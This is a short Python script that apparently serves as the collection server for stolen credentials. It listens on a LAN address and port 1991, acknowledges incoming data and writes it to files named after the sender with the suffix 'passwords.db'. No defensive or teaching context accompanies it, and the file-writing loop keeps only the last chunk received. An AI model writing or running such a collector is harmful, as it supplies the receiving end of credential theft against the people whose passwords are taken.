'''
Created on 20 Jun 2015
 
@author: Robyn Hode
'''
import socket

HOST = '192.168.0.104'
PORT = 1991

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()

    with conn:
        print('Connected by: ', addr)

        while True:
            # Receive data
            data = conn.recv(1048576)
            if not data:
                break

            conn.send(b'success')
            # Write data
            filename = str(addr) + "passwords.db"
            with open(filename, "wb") as f:
                f.write(data)
                f.flush()
